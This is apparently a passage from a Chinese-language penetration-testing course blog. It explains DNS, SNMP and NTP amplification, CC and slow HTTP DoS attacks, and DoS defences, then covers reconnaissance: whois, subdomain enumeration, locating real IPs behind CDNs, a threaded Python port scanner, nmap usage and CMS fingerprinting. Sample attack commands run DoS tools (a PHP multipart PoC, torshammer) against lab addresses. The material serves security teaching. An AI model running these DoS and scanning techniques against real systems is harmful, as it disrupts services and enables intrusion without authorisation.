title="DNS协议放大效果"></a>DNS协议放大效果</h4><ul><li>查询请求流量小，但响应流量可能非常巨大</li><li>dig ANY hp.com @202.106.0.20 (流量放大约8倍）</li></ul><h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h4><ul><li>伪造<strong>源地址</strong>为被攻击目标地址，向递归域名查询服务器发起查询 </li><li>DNS服务器成为流量放大和实施攻击者，大量DNS服务器实现DDoS</li></ul><h3 id="SNMP放大攻击"><a href="#SNMP放大攻击" class="headerlink" title="SNMP放大攻击"></a>SNMP放大攻击</h3><h4 id="简单网络管理协议"><a href="#简单网络管理协议" class="headerlink" title="简单网络管理协议"></a>简单网络管理协议</h4><p><strong>Simple Network Management Protocol</strong></p><ul><li>服务端UDP 161 / 162</li><li>管理站（manager /客户端）、被管理设备（agent /服务端）</li><li>管理信息数据库（MIB）是一个信息存储库，包含管理代理中的有关配置和性能的数据，按照不同分类，包含分属不同组的多个数据对象</li><li>每一个节点都有一个对象标识符（OID)来唯一的标识</li><li>IETF定义标准的MIB库/厂家自定义MIB库</li></ul><h4 id="攻击原理-1"><a href="#攻击原理-1" class="headerlink" title="攻击原理"></a>攻击原理</h4><ul><li>请求流量小，查询结果返回流量大 </li><li>结合伪造源地址实现攻击</li></ul><h3 id="NTP放大攻击"><a href="#NTP放大攻击" class="headerlink" title="NTP放大攻击"></a>NTP放大攻击</h3><h4 id="网络时间协议"><a href="#网络时间协议" class="headerlink" title="网络时间协议"></a>网络时间协议</h4><p><strong>Network Time Protocol</strong></p><ul><li>保证网络设备时间同步</li><li>电子设备互相干扰导致时钟差异越来越大</li><li>影响应用正常运行、日志审计不可信</li><li>服务端 UDP 123</li></ul><h4 id="攻击原理-2"><a href="#攻击原理-2" class="headerlink" title="攻击原理"></a>攻击原理</h4><ul><li>NTP服务提供monlist (MON_GETLIST)查询功能，监控NTP服务器的状况</li><li>客户端查询时，NTP服务器返回最后同步时间的600个客户端IP，每6个IP—个数据包，最多100个数据包（放大约100倍）</li></ul><h3 id="CC攻击"><a href="#CC攻击" class="headerlink" title="CC攻击"></a>CC攻击</h3><h4 id="实现DDOS和伪装攻击：CC"><a href="#实现DDOS和伪装攻击：CC" class="headerlink" title="实现DDOS和伪装攻击：CC"></a>实现DDOS和伪装攻击：CC</h4><p><strong>Challenge Collapsar</strong></p><ul><li>CC主要是用来攻击页面的 </li><li>可以增加数据库并发访问压力</li><li>服务端被访问频率越高，占用的系统资源越高</li></ul><h4 id="攻击原理-3"><a href="#攻击原理-3" class="headerlink" title="攻击原理"></a>攻击原理</h4><ul><li>攻击者控制某些主机不停地发大量数据包给对方服务器造成服务器资源耗尽，一直到宕机崩溃</li><li>就是模拟多个用户（多少线程就是多少用户）不停地进行访问那些需要大量数据操作（就是需要大量CPU时间）的页面</li><li>造成服务器资源的浪费，CPU长时间处于100%，永远都有处理不完的连接直至就网络拥塞，正常的访问被中止</li></ul><h3 id="应用层DoS"><a href="#应用层DoS" class="headerlink" title="应用层DoS"></a>应用层DoS</h3><h4 id="应用服务漏洞"><a href="#应用服务漏洞" class="headerlink" title="应用服务漏洞"></a>应用服务漏洞</h4><ul><li>服务代码存在漏洞，遇异常提交数据时程序崩溃</li><li>应用处理<strong>大量并发请求</strong>能力有限，被拒绝的是应用或OS</li></ul><h4 id="缓冲区溢出漏洞"><a href="#缓冲区溢出漏洞" class="headerlink" title="缓冲区溢出漏洞"></a>缓冲区溢出漏洞</h4><ul><li>向目标函数随机提交数据，特定情况下数据覆盖临近寄存器或内存</li><li>影响：远程代码执行、DoS</li><li>利用模糊测试方法发现<strong>缓冲区溢出</strong>漏洞</li></ul><h4 id="CesarFTP-0-99-服务漏洞"><a href="#CesarFTP-0-99-服务漏洞" class="headerlink" title="CesarFTP 0.99 服务漏洞"></a>CesarFTP 0.99 服务漏洞</h4><ul><li>ftp_fuzz.py # MKD/RMD</li><li>MS12-020远程桌面协议DoS漏洞</li></ul><h4 id="攻防演示过程"><a href="#攻防演示过程" class="headerlink" title="攻防演示过程"></a>攻防演示过程</h4><p>针对<strong>PHP版本低</strong>漏洞发起攻击</p><p>开启PHP网站服务：</p><p> <img src="assets/image-20221225154832858.png" alt="image-20221225154832858"></p><p>利用代码向网站发起攻击：</p><pre class="line-numbers language-none"><code class="language-none"># 在windows系统cmd命令行进行攻击测试即可php-multipartform-dos-poc.py -t http://192.168.110.12/DVWA/login.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="应用层DoS攻击方式-Slowhttptest"><a href="#应用层DoS攻击方式-Slowhttptest" class="headerlink" title="应用层DoS攻击方式_Slowhttptest"></a>应用层DoS攻击方式_Slowhttptest</h4><ul><li><p><strong>低带宽</strong>应用层<strong>慢速</strong>DoS攻击（相对于CC等快速攻击而言的慢速) </p></li><li><p>最早由Python编写，跨平台支持（Linux、win、Cygwin、OSX) </p></li><li><p>尤其擅长攻击apache、tomcat (几乎百发百中)</p><p>客户端 100请求 –  服务端</p></li></ul><p><strong>1)</strong>   <strong>攻击方法实现：Slowloris、Slow HTTP POST攻击</strong></p><p>耗尽应用的并发连接池，类似于Http层的Syn flood。</p><p>HTTP协议默认在服务器全部接收请求之后才开始处理，若客户端发送速度缓慢或不完整，服务器时钟为其保留连接资源池占用，此类大量并发将导致DoS</p><p>Slowloris：完整的http请求结尾是\r\n\r\n，攻击发\r\n……   </p><p>Slow POST: HTTP头content-length声明长度，但body部分缓慢发送</p><p><strong>2)</strong>   <strong>攻击方法实现：Slow Read attack攻击</strong></p><ul><li>与slowloris and slow POST目的相同，都是耗尽应用的并发连接池 </li><li>不同之处在于请求正常发送，但慢速读取响应数据 </li><li>攻击者调整TCP window窗口大小，使服务器慢速返回数据</li></ul><p><strong>3)</strong>   <strong>攻击方法实现：Apache Range Header attackk攻击</strong></p><ul><li>客户端传输大文件时，体积查过HTTP Body大小限制时进行分段 </li><li>耗尽服务器CPU、内存资源</li></ul><p>攻击测试：</p><pre class="line-numbers language-none"><code class="language-none">torshammer.py –t 192.168.32.84 -p 8080 -r 1000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="拒绝服务攻击防护思路"><a href="#拒绝服务攻击防护思路" class="headerlink" title="拒绝服务攻击防护思路"></a>拒绝服务攻击防护思路</h2><h3 id="防护方法"><a href="#防护方法" class="headerlink" title="防护方法"></a>防护方法</h3><h4 id="利用开源软件实现防护"><a href="#利用开源软件实现防护" class="headerlink" title="利用开源软件实现防护"></a>利用开源软件实现防护</h4><ol><li><p>TCP连接<strong>有效性</strong>检查</p><p>校验TCP连接时间，指定时间内服务器最少发送的报文数，校验失败的屏蔽时间</p><p>TCP连接约束 禁止代理访问</p></li><li><p>服务器资源<strong>占用限制</strong></p></li><li><p>TCP连接<strong>会话限制</strong></p></li><li><p>HTTP<strong>代理限制</strong></p></li></ol><p> <img src="assets/image-20221226135947848.png" alt="image-20221226135947848"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/9-xin-xi-shou-ji/xin-xi-shou-ji/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/9-xin-xi-shou-ji/xin-xi-shou-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集概述"><a href="#信息收集概述" class="headerlink" title="信息收集概述"></a>信息收集概述</h1><h2 id="渗透测试的主要流程"><a href="#渗透测试的主要流程" class="headerlink" title="渗透测试的主要流程"></a>渗透测试的主要流程</h2><ul><li>确定目标 </li><li>信息收集 </li><li>漏洞扫描 </li><li>漏洞利用 </li><li>形成报告</li></ul><h2 id="渗透测试的重要性"><a href="#渗透测试的重要性" class="headerlink" title="渗透测试的重要性"></a>渗透测试的重要性</h2><p>影响后续流程的效果 </p><h2 id="包括内容"><a href="#包括内容" class="headerlink" title="包括内容"></a>包括内容</h2><ol><li>域名相关信息 </li><li>IP相关信息 </li><li>端口服务相关信息</li><li>指纹识别（CMS/CDF/WAF）</li><li>Google Hacking </li><li>目录扫描 </li><li>Git Hack</li></ol><h2 id="学习框架"><a href="#学习框架" class="headerlink" title="学习框架"></a>学习框架</h2><ol><li>这种信息是什么？</li><li>怎么收集这种信息？ </li><li>收集这种信息有什么用？</li></ol><h1 id="域名信息收集"><a href="#域名信息收集" class="headerlink" title="域名信息收集"></a>域名信息收集</h1><h2 id="域名是什么"><a href="#域名是什么" class="headerlink" title="域名是什么"></a>域名是什么</h2><p>用来代替IP，找到网络上的一台计算机</p><p><a href="http://www.baldu.com/">www.baldu.com</a> –&gt;域名解析服务 –&gt; 220.181.38.148</p><h2 id="域名的分类"><a href="#域名的分类" class="headerlink" title="域名的分类"></a>域名的分类</h2><h3 id="国际域名"><a href="#国际域名" class="headerlink" title="国际域名"></a>国际域名</h3><ul><li>.com(商业公司)</li><li>.net(网络服务)</li><li>.org(组织协会等)</li><li>.gov(政府部 门)</li><li>.edu(教育机构)</li><li>.mil(军事领域)</li><li>.int(国际组织)</li></ul><h3 id="国别域名"><a href="#国别域名" class="headerlink" title="国别域名"></a>国别域名</h3><ul><li>.CN代表中国</li><li>.UK代表英国</li><li>.US代表美国</li></ul><h3 id="新顶级域名"><a href="#新顶级域名" class="headerlink" title="新顶级域名"></a>新顶级域名</h3><ul><li>biz</li><li>info</li><li>name</li><li>pro</li><li>aero</li><li>coop</li><li>museum</li><li>……</li></ul><h2 id="域名联系人信息"><a href="#域名联系人信息" class="headerlink" title="域名联系人信息"></a>域名联系人信息</h2><h3 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h3><ul><li>姓名</li><li>邮箱</li><li>信息</li><li>电话</li><li>地址</li></ul><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><ul><li><a href="https://whois.chinaz.com/">https://whois.chinaz.com</a></li><li><a href="http://whoissoft.com/">http://whoissoft.com/</a></li><li><a href="https://whois.cnnic.cn/WelcomeServlet">https://whois.cnnic.cn/WelcomeServlet</a></li><li>kali自带了<code>whois</code>命令</li></ul><h3 id="域名反查"><a href="#域名反查" class="headerlink" title="域名反查"></a>域名反查</h3><ul><li><a href="http://whois.chinaz.com/reverse">http://whois.chinaz.com/reverse</a></li><li><a href="http://mwhois.chinaz.com/">http://mwhois.chinaz.com/</a></li></ul><h3 id="ICP备案"><a href="#ICP备案" class="headerlink" title="ICP备案"></a>ICP备案</h3><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p>所有服务器或者虚拟主机放在大陆的网站，域名必须要在<strong>工信部</strong>的系统里面<strong>备案</strong>，否则不能通过域名访问</p><h4 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h4><ul><li>姓名</li><li>备案号</li><li>邮箱</li></ul><h4 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h4><ul><li><a href="https://beian.mit.gov.cn/">https://beian.mit.gov.cn/</a></li><li><a href="https://icp.chinaz.com/">https://icp.chinaz.com/</a></li><li><a href="https://www.beian88.com/">https://www.beian88.com/</a></li></ul><h3 id="企业信息查询"><a href="#企业信息查询" class="headerlink" title="企业信息查询"></a>企业信息查询</h3><ul><li><p>天眼查</p></li><li><p>企查查</p></li><li><p>国家企业信用信息公示系统</p><p><a href="http://www.gsxt.gov.cn/index.html">http://www.gsxt.gov.cn/index.html</a></p></li></ul><h2 id="子域名信息"><a href="#子域名信息" class="headerlink" title="子域名信息"></a>子域名信息</h2><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><ul><li>字典</li><li>枚举</li></ul><h3 id="工具-2"><a href="#工具-2" class="headerlink" title="工具"></a>工具</h3><ul><li>Layer</li><li><a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a></li><li><a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></li><li><a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></li></ul><h2 id="域名DNS信息"><a href="#域名DNS信息" class="headerlink" title="域名DNS信息"></a>域名DNS信息</h2><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><ul><li>域名商，指定DNS服务器</li></ul><p><img src="assets/image-20221129095350108.png" alt="image-20221129095350108"></p><ul><li>DNS服务商，指定记录</li></ul><p><img src="assets/image-20221129095550378.png" alt="image-20221129095550378"></p><h4 id="记录类别"><a href="#记录类别" class="headerlink" title="记录类别"></a>记录类别</h4><p><img src="assets/image-20221129095627979.png" alt="image-20221129095627979"></p><h4 id="工具-3"><a href="#工具-3" class="headerlink" title="工具"></a>工具</h4><ul><li><p><a href="http://dbcha.com/">http://dbcha.com/</a></p></li><li><p><a href="https://sitereport.netcraft.com/">https://sitereport.netcraft.com/</a></p></li><li><p><a href="http://www.jsons.cn/nslookup/">http://www.jsons.cn/nslookup/</a></p></li><li><p>kali命令</p></li></ul><p><code>host baidu.com</code></p><p><code>dig baidu.com</code></p><h1 id="IP信息"><a href="#IP信息" class="headerlink" title="IP信息"></a>IP信息</h1><h2 id="如何根据域名获得IP"><a href="#如何根据域名获得IP" class="headerlink" title="如何根据域名获得IP"></a>如何根据域名获得IP</h2><h3 id="DNS服务器类型"><a href="#DNS服务器类型" class="headerlink" title="DNS服务器类型"></a>DNS服务器类型</h3><ul><li>本地域名服务器</li><li>根域名服务器</li><li>顶级域名服务器 (Top Level DNS, TLD)</li><li>授权域名服务器</li></ul><h3 id="工具-4"><a href="#工具-4" class="headerlink" title="工具"></a>工具</h3><ul><li>ping</li></ul><p><code>man ping</code></p><ul><li>nslookup</li></ul><p><code>nslookup -type="MX" baidu.com</code></p><h3 id="IP归属"><a href="#IP归属" class="headerlink" title="IP归属"></a>IP归属</h3><p><a href="http://ipwhois.cnnic.net.cn/">http://ipwhois.cnnic.net.cn/</a></p><h2 id="如何获得CDN被后的真实IP"><a href="#如何获得CDN被后的真实IP" class="headerlink" title="如何获得CDN被后的真实IP"></a>如何获得CDN被后的真实IP</h2><h3 id="什么是CDN"><a href="#什么是CDN" class="headerlink" title="什么是CDN"></a>什么是CDN</h3><p>Content Delivery Network一内容分发网络</p><p>让在各个不同的地点的网络用户，都可以迅速访问到网站提供的内容</p><h3 id="常见厂商"><a href="#常见厂商" class="headerlink" title="常见厂商"></a>常见厂商</h3><p>CloudFlare/CofrF.o…..</p><p>帝联/蓝讯/网宿/七牛云/腾讯/百度/阿里…..</p><h3 id="CDN工作流程"><a href="#CDN工作流程" class="headerlink" title="CDN工作流程"></a>CDN工作流程</h3><ul><li>当终端用户(北京)向<a href="http://www.a.com下的指定资源发起请求时,首先向ldns/">www.a.com下的指定资源发起请求时，首先向LDNS</a> (本地DNS)发起域名解析请求。\</li><li>LDNS检查缓存中是否有<a href="http://www.a.com的ip地址记录.如果有,则直接返回给终端用户;如果没有,则向授权dns查询./">www.a.com的IP地址记录。如果有，则直接返回给终端用户;如果没有，则向授权DNS查询。</a></li><li>当授权DNS解析<a href="http://www.a.com时,返回域名cname/">www.a.com时，返回域名CNAME</a> <a href="http://www.a/">www.a</a>. tbcdn.com对应IP地址。</li><li>域名解析请求发送至阿里云DNS调度系统， 并为请求分配最佳节点IP地址。</li><li>LDNS获取DNS返回的解析IP地址。</li><li>用户获取解析IP地址。</li><li>用户向获取的IP地址发起对该资源的访问请求。</li></ul><h3 id="如何获取真实IP"><a href="#如何获取真实IP" class="headerlink" title="如何获取真实IP"></a>如何获取真实IP</h3><h4 id="查看IP数量"><a href="#查看IP数量" class="headerlink" title="查看IP数量"></a>查看IP数量</h4><p><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></p><p>nslookup</p><h4 id="历史DNS"><a href="#历史DNS" class="headerlink" title="历史DNS"></a>历史DNS</h4><p><a href="http://dnshistory.org/">http://dnshistory.org/</a></p><p><a href="http://toolbar.netcraft.com/site_report?url=">http://toolbar.netcraft.com/site_report?url=</a></p><p><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></p><p><a href="https://github.com/vincentcox/bypass-firewalls-by-DNS-history">https://github.com/vincentcox/bypass-firewalls-by-DNS-history</a></p><h4 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h4><h4 id="国外主机解析"><a href="#国外主机解析" class="headerlink" title="国外主机解析"></a>国外主机解析</h4><p><a href="https://asm.ca.com/zh_cn/ping.php">https://asm.ca.com/zh_cn/ping.php</a></p><p><a href="http://host-tracker.com/">http://host-tracker.com/</a></p><p><a href="http://www.webpagetest.org/">http://www.webpagetest.org/</a></p><p><a href="https://dnscheck.pingdom.com/">https://dnscheck.pingdom.com/</a></p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ul><li><p>网络空间搜索引擎</p><ul><li><p>fofa</p></li><li><p>censys</p></li></ul></li><li><p>邮件</p></li><li><p>手机APP抓包</p></li><li><p>微信服务号抓包</p></li><li><p>……</p></li></ul><h1 id="端口服务信息"><a href="#端口服务信息" class="headerlink" title="端口服务信息"></a>端口服务信息</h1><h2 id="扫描的思路"><a href="#扫描的思路" class="headerlink" title="扫描的思路"></a>扫描的思路</h2><p>一个服务一个端口 </p><h3 id="本机端口"><a href="#本机端口" class="headerlink" title="本机端口"></a>本机端口</h3><ul><li>windows</li></ul><p><code>netstat -aon|findstr 3306</code> </p><ul><li>Linux</li></ul><p><code>netstat -an|grep 3306</code> </p><h3 id="远程机器端口"><a href="#远程机器端口" class="headerlink" title="远程机器端口"></a>远程机器端口</h3><p><code>telnet 192.168.142.137 80</code> </p><p><code>wget 192.168.142.137 80</code> </p><p><code>nc -vz 192.168.142.137 445</code> </p><p><code>nc -vz 192.168.142.137 80-9000</code></p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>wscan.py </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token punctuation">,</span> threading<span class="token keyword">def</span> <span class="token function">TCP_connect</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port_number<span class="token punctuation">,</span> delay<span class="token punctuation">,</span> output<span class="token punctuation">)</span><span class="token punctuation">:</span>    TCPsock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    TCPsock<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>SOL_SOCKET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SO_REUSEADDR<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    TCPsock<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span>delay<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        TCPsock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port_number<span class="token punctuation">)</span><span class="token punctuation">)</span>        output<span class="token punctuation">[</span>port_number<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'Listening'</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        output<span class="token punctuation">[</span>port_number<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">def</span> <span class="token function">scan_ports</span><span class="token punctuation">(</span>host_ip<span class="token punctuation">,</span> delay<span class="token punctuation">)</span><span class="token punctuation">:</span>    threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token comment"># To run TCP_connect concurrently</span>    output <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>         <span class="token comment"># For printing purposes</span>    <span class="token comment"># Spawning threads to scan ports</span>    <span class="token comment"># 先扫10000个端口</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>TCP_connect<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>host_ip<span class="token punctuation">,</span> i<span class="token punctuation">,</span> delay<span class="token punctuation">,</span> output<span class="token punctuation">)</span><span class="token punctuation">)</span>        threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>    <span class="token comment"># Starting threads</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># Locking the script until all threads complete</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># Printing listening ports from small to large</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> output<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'Listening'</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">': '</span> <span class="token operator">+</span> output<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    host_ip <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Please enter host IP: "</span><span class="token punctuation">)</span>    <span class="token comment"># 超时抛出异常</span>    delay <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"How many seconds the socket is going to wait until timeout: "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       scan_ports<span class="token punctuation">(</span>host_ip<span class="token punctuation">,</span> delay<span class="token punctuation">)</span>    <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Press Any Key to Exit"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a>常见端口</h2><h3 id="文件共享服务"><a href="#文件共享服务" class="headerlink" title="文件共享服务"></a>文件共享服务</h3><ul><li>21/22/69 FTP/SFTP文件传输协议</li><li>2049 NFS服务（Network File System）</li><li>139 Samba服务</li><li>389  LDAP目录访问协议（Light Directory Access Portocol）</li></ul><h3 id="远程连接服务"><a href="#远程连接服务" class="headerlink" title="远程连接服务"></a>远程连接服务</h3><ul><li>22 SSH远程连接 </li><li>23 Telnet远程连接</li><li>3389 RDP远程桌面连接</li><li>5900 VNC远程连接</li><li>5632 PcAnywhere远程控制服务</li><li></li></ul><h3 id="Web应用服务"><a href="#Web应用服务" class="headerlink" title="Web应用服务"></a>Web应用服务</h3><ul><li>80/443/8080  常见的web服务端口</li><li>7001/7002 Weblogic控制台</li><li>8080/8089 Jboss/resin/jetty/Jenkins</li><li>9090 Websphere控制台</li><li>4848 Glassfish控制台</li><li>1352  Lotus domino邮件服务</li><li>10000 Webmin-web控制面板</li></ul><h3 id="数据库服务"><a href="#数据库服务" class="headerlink" title="数据库服务"></a>数据库服务</h3><ul><li>3306  MySQL</li><li>1433 MSSQL数据库</li><li>1521 Oracle数据库</li><li>5432 PostgreSQL数据库</li><li>27017/27018 MongoDB</li><li>6379  Redis数据库</li><li>5000 Sysbase/DB2数据库</li></ul><h3 id="邮件服务"><a href="#邮件服务" class="headerlink" title="邮件服务"></a>邮件服务</h3><ul><li>25 SMTP邮件服务</li><li>110  POP3协议</li><li>143 IMAP协议</li></ul><h3 id="网络常见协议"><a href="#网络常见协议" class="headerlink" title="网络常见协议"></a>网络常见协议</h3><ul><li>53 DNS域名系统</li><li>67/68 DHCP服务</li><li>161  SNMP协议</li></ul><h3 id="特殊服务"><a href="#特殊服务" class="headerlink" title="特殊服务"></a>特殊服务</h3><ul><li>2181  Zookeeper服务</li><li>8069 Zabbix服务</li><li>9200/9300 Elasticsearch服务</li><li>11211 Memcached服务</li><li>512/513/514 Linux Rexec服务</li><li>873 Rsync服务</li><li>3690 SVN服务</li><li>50000 SAP Management Console</li></ul><h2 id="metasploitable2靶机"><a href="#metasploitable2靶机" class="headerlink" title="metasploitable2靶机"></a>metasploitable2靶机</h2><ul><li>下载、解压、导入VM </li><li>默认用户名密码:msfadmin/msfadmin </li><li>修改root密码 <code>sudo passwd root</code> </li><li><code>ifconfig</code>查看IP</li></ul><h2 id="扫描工具NMap"><a href="#扫描工具NMap" class="headerlink" title="扫描工具NMap"></a>扫描工具NMap</h2><h3 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h3><ul><li>Network Mapper</li></ul><p> <a href="https://nmap.org/">https://nmap.org/</a></p><ul><li>图形界面</li></ul><p>zenmap </p><ul><li><p>主要功能 </p><ol><li><p>扫描主机(Host Discovery) </p></li><li><p>扫描端口(Port Scanning) </p></li><li><p>探测操作系统、软件版本 (Operating System Detection、Version Detection)</p></li></ol></li></ul><h3 id="参数分类"><a href="#参数分类" class="headerlink" title="参数分类"></a>参数分类</h3><ul><li><a href="https://nmap.org/book/man.html">https://nmap.org/book/man.html</a></li><li>TARGET SPECIFICATION:目标，对什么进行扫 描，比如是域名、IP或者网络 </li><li>HOST DISCOVERY:主机发现，怎么对主机进行 扫描，比如简单扫描，还是全部扫一遍，或者用 相应的协议扫 </li><li>SCAN TECHNIQUES:扫描技术，协议的设置 </li><li>PORT SPECIFICATION AND SCAN ORDER:端 口和扫描顺序设置 </li><li>SERVICE/VERSION DETECTION:服务和版本识 别 </li><li>SCRIPT SCAN:使用脚本，nmap本身内置了大量的lua脚本，而且还可以自己编写脚本 </li><li>OS DETECTION:操作系统识别 </li><li>TIMING AND PERFORMANCE:时间和性能设置，比如扫描频率、重试次数等等 </li><li>FIREWALL/IDS EVASION AND SPOOFING:防火 墙绕过和欺骗，比如使用代理，假IP等 </li><li>OUTPUT:把扫描接出输出到文件 </li><li>MISC: 杂项：启用IPv6等等配置</li></ul><h3 id="参数示例"><a href="#参数示例" class="headerlink" title="参数示例"></a>参数示例</h3><h4 id="不带参数"><a href="#不带参数" class="headerlink" title="不带参数"></a>不带参数</h4><p><code>nmap 192.168.142.137</code> </p><p><code>nmap testfire.net</code> </p><h4 id="简单扫描"><a href="#简单扫描" class="headerlink" title="简单扫描"></a>简单扫描</h4><p><code>nmap -sP 192.168.142.1370</code> </p><h4 id="指定端口或范围扫描"><a href="#指定端口或范围扫描" class="headerlink" title="指定端口或范围扫描"></a>指定端口或范围扫描</h4><p><code>nmap -p0-65535 192.168.142.137</code> </p><h4 id="探测操作系统："><a href="#探测操作系统：" class="headerlink" title="探测操作系统："></a>探测操作系统：</h4><p><code>nmap -O 192.168.142.137</code> </p><h4 id="只进行主机发现，不进行端口扫描"><a href="#只进行主机发现，不进行端口扫描" class="headerlink" title="只进行主机发现，不进行端口扫描"></a>只进行主机发现，不进行端口扫描</h4><p><code>nmap -sn 192.168.40.195/24</code></p><h3 id="界面工具Zenmap"><a href="#界面工具Zenmap" class="headerlink" title="界面工具Zenmap"></a>界面工具Zenmap</h3><ul><li>第一种：Intense scan </li><li>第二种：Intense scan plus UDP </li><li>第三种：Intense scan,all TCP ports </li><li>第四种：Intense scan,no ping </li><li>第五种：Ping scan </li><li>第六种：Quick scan </li><li>第七种：Quick scan plus </li><li>第八种：Quick traceroute </li><li>第九种：Regular scan </li><li>第十种：Slow comprehensive scan</li></ul><h4 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h4><ul><li>masscan、nbtscan </li><li><a href="http://coolaf.com/tool/port">http://coolaf.com/tool/port</a></li></ul><h1 id="CMS指纹识别"><a href="#CMS指纹识别" class="headerlink" title="CMS指纹识别"></a>CMS指纹识别</h1><h2 id="1、什么是指纹识别？"><a href="#1、什么是指纹识别？" class="headerlink" title="1、什么是指纹识别？"></a>1、什么是指纹识别？</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>根据关键特征，识别程序名称、版本等信息 </p><h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><ol><li>CMS信息：比如Discuz、织梦、帝国CMS、 PHPCMS、ECshop等； </li><li>前端技术：比如HTML5、jquery、 bootstrap、Vue、ace等； </li><li>开发语言：比如PHP、Java、Ruby、 Python、C#等； </li><li>Web服务器：比如Apache、 Nginx,、IIS、 lighttpd等；</li><li>应用服务器：比如Tomcat、Jboss、 